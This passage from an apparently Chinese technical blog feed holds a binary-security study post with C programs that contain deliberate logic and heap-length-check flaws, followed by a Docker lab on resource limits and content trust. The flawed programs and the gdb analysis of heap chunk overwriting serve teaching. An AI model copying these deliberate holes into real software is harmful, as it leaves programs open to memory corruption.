<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* equality */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (i=<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">"i=1\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>运行程序，打印出i=1，即判断条件为真，执行了printf语句，而之前为i的赋值为0，本不应判断为真的，这就是<code>==</code>与<code>=</code>的使用不正确导致的漏洞；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303230411.png" style="zoom:50%;">

<h1 id="函数默认参数问题"><a href="#函数默认参数问题" class="headerlink" title="函数默认参数问题"></a>函数默认参数问题</h1><h2 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h2><ul>
<li>  函数存在默认参数；</li>
<li>  函数存在缺省参数情况；</li>
<li>  部分函数部分参数通常不会用到；</li>
<li>  这些参数在编码中不受重视，却会影响函数的处理方式；</li>
<li>  如果这些参数在调用时，出现与正常参数格式等不一样的情况，就会产生难以预料的后果，造成逻辑漏洞；</li>
</ul>
<h2 id="后果-2"><a href="#后果-2" class="headerlink" title="后果"></a>后果</h2><p>导致函数处理结果与预期不一致，后果难以预料；</p>
<h2 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h2><p><code>read(int fd, void *buf, size_t count)</code></p>
<ul>
<li><p><code>read</code>函数有三个参数；</p>
<ul>
<li>  第一个参数是一个<code>int</code>类型的文件描述符；</li>
<li>  第二个是数据保存的缓冲区首地址；</li>
<li>  第三个是请求读入的字节数；</li>
</ul>
</li>
<li><p><code>read</code>函数参数问题:</p>
<p>  如果这个<code>read</code>函数的第一个参数为<code>0</code>，<code>read</code>函数不会报错，也没有文件可以读取，会选择从标准输入流中读入数据，也就是可以输入任意数据，且函数的返回值也没有异常；</p>
</li>
</ul>
<p>对以下程序进行分析；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* read0 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> handle=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> handle0=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> slen=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">20</span>]=<span class="string">""</span>;</span><br><span class="line">    handle = open(<span class="string">"read0.txt"</span>,O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,handle);</span><br><span class="line">    </span><br><span class="line">    slen = read(handle,s,<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,slen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,s);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>程序使用只读的方式从文件read0.txt中读入数据，而read0.txt中存储为<code>1234567890</code>；</p>
<p>运行程序结果如下；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303232803.png" style="zoom:50%;">

<ul>
<li>  对于open函数，打开一个文件时，返回未被使用的最小文件描述符(非负整数)，失败返回-1；</li>
<li>  由于系统中默认已打开三个文件描述符(0:标准输入，1:标准输出 ，2:标准出错)之外，未被使用的最小文件描述符就是3；</li>
<li>  可以看到，open函数为read0.txt分配的文件描述符为3，成功读入了11个字符，其中有一位为字符串结束符，最后输出了文件内容；</li>
</ul>
<p>如果这里的文件描述符，误用了初始化后未使用的另一个描述符<code>handle0</code>，就会变为从标准输入中读入了；</p>
<p>程序如下，其中<code>slen=read(handle0,s,15)</code>中，将handle误用为参数handle0；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* read1 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> handle=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> handle0=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> slen=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">20</span>]=<span class="string">""</span>;</span><br><span class="line">    handle = open(<span class="string">"read0.txt"</span>,O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,handle);</span><br><span class="line">    </span><br><span class="line">    slen = read(handle0,s,<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,slen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,s);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>漏洞分析：</p>
<ul>
<li><p>  linux中会对文件进行重定向；</p>
</li>
<li><p>  对应文件描述符0、1、2的是标准输入、标准输出、标准错误，这里对应为标准输入了；</p>
</li>
<li><p>运行程序，程序会在调用<code>read</code>函数的时候等输入；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303233726.png" style="zoom:50%;"></li>
<li><p>输入<code>abcdef</code>，看到确实是从标准输入中进行读入并且输出；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303233901.png" style="zoom:50%;"></li>
</ul>
<h1 id="malloc导致的字符串长度判别错误"><a href="#malloc导致的字符串长度判别错误" class="headerlink" title="malloc导致的字符串长度判别错误"></a><code>malloc</code>导致的字符串长度判别错误</h1><h2 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h2><ul>
<li>  堆中情况较为复杂；</li>
<li>  <code>malloc</code>连续分配的地址不一定连续；</li>
<li>  防止无谓的因字符串对齐而浪费存储空间，使用了下一个分配的地址参与了字符串长度的判断；</li>
<li>  但是当连续的堆，分配不到相连续的存储空间时；</li>
<li>  导致下一个分配地址会与当前分配地址间隔比较远；</li>
<li>  进行长度判别就不准确了；</li>
</ul>
<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>对以下程序进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* length */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stu</span>{</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">string</span>;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">char</span> *string1 = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stu</span> *<span class="title">stu1</span> =</span> (<span class="keyword">struct</span> stu *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> stu));</span><br><span class="line">    stu1-&gt;<span class="built_in">string</span> = string1;</span><br><span class="line">    <span class="built_in">strcpy</span>(string1,<span class="string">"AA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(stu1-&gt;name,<span class="string">"AAAAAAA"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *string2 = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stu</span> *<span class="title">stu2</span> =</span> (<span class="keyword">struct</span> stu *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> stu));</span><br><span class="line">    stu2-&gt;<span class="built_in">string</span> = string2;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(string2,<span class="string">"BB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(stu2-&gt;name,<span class="string">"BBBBBBB"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">free</span>(stu1-&gt;<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(stu1);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;i);</span><br><span class="line">    <span class="type">char</span> *string3 = (<span class="type">char</span>*) <span class="built_in">malloc</span>(i);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stu</span> *<span class="title">stu3</span> =</span> (<span class="keyword">struct</span> stu *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> stu));</span><br><span class="line">    stu3-&gt;<span class="built_in">string</span> = string3;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *string3addr =  (<span class="type">unsigned</span> <span class="type">int</span>*) &amp;stu3-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *stu3addr =  (<span class="type">unsigned</span> <span class="type">int</span>*) &amp;stu3;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x %x\n"</span>,*stu3addr,*string3addr);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,*stu3addr-*string3addr<span class="number">-4</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(str)&gt;=(*stu3addr-*string3addr<span class="number">-4</span>)){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"string is too long!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strcpy</span>(string3,str);</span><br><span class="line">    <span class="built_in">strcpy</span>(stu3-&gt;name,<span class="string">"CCCCCCC"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(stu2-&gt;<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(stu2);</span><br><span class="line">    <span class="built_in">free</span>(stu3-&gt;<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(stu3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li>程序定义了一个结构体，由一个字符串指针和一个字符串构成；<ul>
<li>  存储时，采用了连续分配两个存储空间的方式，对字符串指针所指向字符串，和结构体本身字符串进行存储；</li>
</ul>
</li>
<li>  在运行程序时，首先连续配置了两个结构体，以及它们对应的字符串；</li>
<li>  然后将第一个字符串和结构体的空间释放掉；</li>
<li>  接下来就到了会触发漏洞的关键输入部分；</li>
<li>  程序允许用户自己输入字符串长度和字符串内容；</li>
<li>而对于字符串长度的判断，就是通过接下来申请的结构体的地址进行计算；<ul>
<li>  调用scanf函数，堆中为其分配了<code>0x410</code>大小；</li>
<li>  即连续分配的两个地址确实不是连续的，中间间隔了第二个结构体和scanf函数的空间，而长度判别在这里就不起作用了；</li>
</ul>
</li>
</ul>
<p>程序正常运行结果如下；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304000120.png" style="zoom:50%;">

<p>使用gdb查看运行情况，主要是堆分配；</p>
<ul>
<li><p>下图为两个原始结构体stu1和stu2申请完成后的汇编代码，两次malloc是stu2的两次申请，可以看到malloc申请的空间依次存储，<code>rax</code>是malloc的返回值， 第4次申请的起始地址是存放在<code>rbp-0x90</code>的位置；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304000417.png" style="zoom:50%;"></li>
<li><p>查看四次分配的空间排布；</p>
<ul>
<li><p>四个malloc，分配了2个结构体中的指针和两个指向结构体指针，这四个指针是在系统固定区域存储，指针所占空间是固定的，每个8字节，所以通过<code>rbp-0x90</code>前推是<code>rbp-0xa8</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304000644.png" style="zoom:50%;"></li>
</ul>
</li>
<li><p>2次free释放了struct1的两块空间；</p>
<ul>
<li><p>被free掉的空间正好是<code>0x602010</code>和<code>0x602050</code>，也即stu1的两块空间；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304000831.png" style="zoom:50%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304000907.png" style="zoom:50%;"></li>
</ul>
</li>
<li><p>接着程序调用了scanf函数；</p>
<ul>
<li>  第一次调用scanf函数，堆中为其分配了<code>0x410</code>大小(默认为scanf函数分配的空间)的空间；</li>
<li>  这个空间大小已经超过了fastbin的范畴，进入了large bin；</li>
<li>  在large bin开始分配前，系统会回收重组所有的unsorted bin，于是被释放的stu1的堆块空间：<code>0x602010</code>到<code>0x602080</code>之间的地址就被合并成了一块；</li>
<li>  但是仍然并不满足scanf函数的<code>0x410</code>空间需要，还要在最后一个堆块，即stu2所占空间后面的空闲空间进行分配；</li>
</ul>
</li>
<li><p>接着进行漏洞的利用，这次scanf申请的字符串空间大小为<code>70</code>，查看分配的字符串的地址和结构体的地址；</p>
<ul>
<li>  stu3的两块指针为<code>rbp-0x88</code>和<code>rbp-0xb0</code>；</li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304001412.png" style="zoom:50%;"></li>
<li><p>查看两指针位置；</p>
<ul>
<li>  分配的起始地址是<code>0x602010</code>与<code>0x602500</code>；</li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304002226.png" style="zoom:50%;"></li>
<li><p>查看地址中的存储内容，可以看到分别是刚回收的<code>0x602010</code>与继续分配的<code>0x602500</code>(stu3的结构体地址)，一块是stu1的堆块，另一个是相隔很远的堆块，即连续分配的两个地址确实不是连续的，中间间隔了第二个结构体和scanf函数的空间，而长度判别在这里就不起作用了(非常长的一块空间)；</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(str)&gt;=(*stu3addr-*string3addr<span class="number">-4</span>)){</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"string is too long!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></li>
<li><p>输入过长会直接覆盖掉第二个结构体的堆结构的chunk头 ，导致free过程中的异常；</p>
<ul>
<li>  <code>free(stu2-&gt;string);</code>，在这里出现bug；</li>
</ul>
</li>
<li><p>在长度判别不起作用的情况下，当给string分配的堆块为70(分配72)，如果输入过长，只要超过80(72+8(占据p_size的8))，则覆盖stu2的size，会直接覆盖掉第二个结构体的堆结构的chunk头，导致stu2的string在free过程中的异常；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304001939.png" style="zoom:50%;"></li>
<li><p>  程序出错，但并没有显示长度过长；</p>
</li>
<li><p>  在长度判别不起作用的情况下，可以看到程序在进行free函数的时候遇到了错误，这就是由malloc没能按顺序分配时所引发的错误；</p>
</li>
</ul>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>初识Docker</title>
    <url>/%E5%88%9D%E8%AF%86Docker.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>熟悉Docker的基本使用、基于cgroups的资源限制和内容信任机制；<span id="more"></span></p>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ol>
<li><p>安装Docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518161134.png"></p>
</li>
<li><p>从Docker Hub拉取Ubuntu基础镜像ubuntu:18.04，创建并运行容器；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br><span class="line">docker images</span><br><span class="line">docker run ubuntu:18.04</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518204529.png"></p>
</li>
<li><p>运行并进入容器，观察容器内部和外部主机在主机名、用户和运行中进程上的不同；</p>
<p>输入如下命令运行进入容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name=ubuntu -it ubuntu:18.04</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518211029.png"></p>
<ul>
<li><p>主机名</p>
<ul>
<li>外部：ubuntu</li>
<li>内部：942d3efe3838</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518211411.png"></p>
</li>
<li><p>用户</p>
<ul>
<li>外部：root</li>
<li>内部：root</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518211754.png"></p>
</li>
<li><p>进程</p>
<ul>
<li><p>未运行docker容器时的进程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518214614.png"></p>
</li>
<li><p>运行docker容器时的进程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518214857.png"></p>
</li>
<li><p>进入docker容器时的进程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200518215023.png"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>编写Dockerfile，基于ubuntu:18.04镜像构建stress镜像；</p>
<ol>
<li><p>创建Dockerfile文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ubuntu-18.04-stress</span><br><span class="line"><span class="built_in">cd</span> ubuntu-18.04-stress/</span><br><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure></li>
<li><p>编写Dockerfile内容如下</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="keyword">From</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y stress</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">"/usr/bin/stress"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> []</span></span><br></pre></td></tr></table></figure></li>
<li><p>生成镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t ubuntu-18.04-stress ./ubuntu-18.04-stress/</span><br></pre></td></tr></table></figure>

<p>其中<code>-t</code>表示标签，<code>./ubuntu-18.04-stress/</code>表示在目录<code>/ubuntu-18.04-stress/</code>下执行Dockerfile</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519114324.png"></p>
<p>查看成功生成镜像</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519114414.png"></p>
</li>
</ol>
</li>
<li><p>从stress镜像启动容器，用<code>docker run</code>的<code>--memory</code>和<code>--memory-swap</code>参数限制容器能够使用的内存容量，在容器中用stress分配内存验证限制的效果</p>
<p>输入如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --memory 100M --memory-swap 200M e73e92924e16 --vm 1 --vm-bytes 500M --verbose</span><br></pre></td></tr></table></figure>

<p>以id为e73e92924e16的镜像创建容器，使用<code>--memory</code>限定该容器分配内存为100M，<code>--memory-swap</code>限定容器最大可分配总内存为200M；设置处理<code>malloc()</code>内存分配函数的进程数量为1，使用<code>--vm-bytes</code>分配内存500M，<code>--verbose</code>表示debug模式。</p>
<p>因为使用<code>--memory-swap</code>限定容器最大可分配总内存为200M，当stress需要分配500M内存时明显不能满足，容器退出，证明<code>--memory</code>和<code>--memory-swap</code>起了作用；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519164401.png"></p>
</li>
<li><p>从stress镜像同时启动多个容器，用<code>docker run</code>的<code>--cpu-shares</code>参数限制容器能够使用的CPU资源，在容器中用stress验证限制的效果</p>
<p>分别打开两个窗口启动两个容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name=test2 e73e92924e16 -c 1024 --cpu 2	<span class="comment">#窗口1</span></span><br><span class="line">docker run --name=test2 e73e92924e16 -c 512 --cpu 1		<span class="comment">#窗口2</span></span><br></pre></td></tr></table></figure>

<p>其中窗口1设置<code>--cpu-shares</code>相对值为1024，cpu数量为2</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519175405.png"></p>
<p>窗口1设置<code>--cpu-shares</code>相对值为512，cpu数量为1</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519174503.png"></p>
<p>查看CPU占用率，test1的两个CPU各使用约50%，test2的CPU使用约100%，这是由于CPU权重约为2:1(1024:512)，以及CPU数量为2:1导致的</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200519174102.png"></p>
</li>
<li><p>在Docker Hub上创建账号；</p>
<p>Docker账号已创建，ID为leeyuxun；</p>
</li>
<li><p>将stress镜像推送到Docker Hub</p>
<ol>
<li><p>登录docker</p>
<p>输入如下命令后输入用户名和密码登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520090938.png"></p>
</li>
<li><p>由于本地仓库名与Docker Hub上不对应，输入如下命令进行更改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag 2338a41b1ae5 lililizhilin/stress:v1</span><br></pre></td></tr></table></figure>

<p>或删除原镜像，重新生成镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t leeyuxun/stress:v1 ./ubuntu-18.04-stress/</span><br></pre></td></tr></table></figure></li>
<li><p>将镜像上传到docker hub的仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push leeyuxun/stress:v1</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520091111.png"></p>
</li>
<li><p>上传完成后，在仓库中查看上传成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520091236.png"></p>
</li>
<li><p>输入如下命令删除本地的镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi leeyuxun/stress:v1</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>通过设置DOCKER_CONTENT_TRUST环境变量启用docker内容信任</p>
<p>命令行输入如下内容启用docker内容信任</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> DOCKER_CONTENT_TRUST=1</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520001532.png"></p>
<p>后续的 docker push 命令会在推送镜像时自动对镜像进行签名。因此，所有的 pull、 build 和 run 命令只会对已签名的镜像起作用。</p>
</li>
<li><p>将带签名的stress镜像推送到Docker Hub（用不同的tag区分未签名和签名版本）</p>
<ol>
<li><p>输入如下命令新建带签名的stress镜像标签为DCT</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t leeyuxun/stress:DCT ./ubuntu-18.04-stress/</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520091531.png"></p>
</li>
<li><p>将带签名的stress镜像推送到Docker Hub</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push leeyuxun/stress:DCT</span><br></pre></td></tr></table></figure>

<p>由于开启 DCT ，该镜像会在推送时自动被签名，在签名时会创建两个密钥：</p>
<ul>
<li>根密钥（Root key）</li>
<li>库密钥（Repository key）</li>
</ul>
<p>默认情况下，两个密钥被保存在家目录下的隐藏目录 ~/.docker/trust下；</p>
<p>根密钥是主密钥，它用于创建和签名新的库密钥，这意味着，用户需要使用强密码予以保护，并且在不使用它的时候对其离线保存。正常情况下，每个用户应该仅有一个密钥，甚至一个团队或组织仅有一个密钥。并且通常情况下仅用它来创建新的库密钥。</p>
<p>库密钥也被称为标签密钥，用于对需要推送到指定镜像库的打标签的镜像进行签名。因此，每个镜像库配备一个库密钥。如果密钥遗失，相对来说容易恢复，但是仍然应该使用强密码进行保护，并妥善保存。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520092125.png"></p>
<p>在Docker Hub中显示上传成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520092200.png"></p>
</li>
<li><p>删除本地镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi leeyuxun/stress:DCT</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>分别尝试拉取未签名版和签名版stress镜像，观察结果</p>
<ol>
<li><p>拉去未签名版的stress镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull leeyuxun/stress:v1</span><br></pre></td></tr></table></figure>

<p>显示错误如下，v1版本没有信任数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520092502.png"></p>
<p>输入如下命令，可以跳过签名拉取镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull --disable-content-trust leeyuxun/stress:v1</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520093158.png"></p>
<p>输入如下命令，运行该镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker container run -d --<span class="built_in">rm</span> leeyuxun/stress:v1</span><br></pre></td></tr></table></figure>

<p>仍然v1版本没有信任数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520093314.png"></p>
</li>
<li><p>拉取签名版的stress镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull leeyuxun/stress:DCT</span><br></pre></td></tr></table></figure>

<p>通过本地保存到库密钥可以正确拉去签名版的stress镜像</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520093543.png"></p>
<p>输入如下命令可以正确运行该镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker container run leeyuxun/stress:DCT  --vm 1 --vm-bytes 100M --verbose</span><br></pre></td></tr></table></figure>

<p>成功创建并运行容器</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520094144.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200520094302.png"></p>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>experiment</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>判断大数互素</title>
    <url>/%E5%88%A4%E6%96%AD%E5%A4%A7%E6%95%B0%E4%BA%92%E7%B4%A0.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>使用Python利用扩展欧几里得算法求大数(超过长整型的数)是否互素.<span id="more"></span></p>
